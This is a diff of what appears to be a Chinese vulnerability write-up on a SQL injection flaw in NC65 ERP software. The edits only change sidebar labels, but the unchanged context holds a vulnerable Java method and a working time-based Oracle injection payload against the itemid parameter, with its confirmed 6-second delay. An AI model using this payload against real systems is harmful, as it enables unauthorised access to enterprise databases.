@@ -61,15 +61,15 @@ NC65
 
 深入探索
 
-安全研究工具
+软件
 
-网络安全培训
+商务软件和生产力软件
 
-漏洞利用手册
+编程
 
 用户可控参数 `itemid` 带入 `ActivityViewHelper.getFileIDs` 方法中，其实现如
 
-漏洞扫描服务
+企业资源规划
 
 ```
 public static LfwFileVO[] getFileIDs(String itemID) {
@@ -118,4 +118,4 @@ itemid=1' AND 1=dbms_pipe.receive_message('RDS', 6)--
 
 成功延时 6 秒
 
-企业资源规划
+数据管理
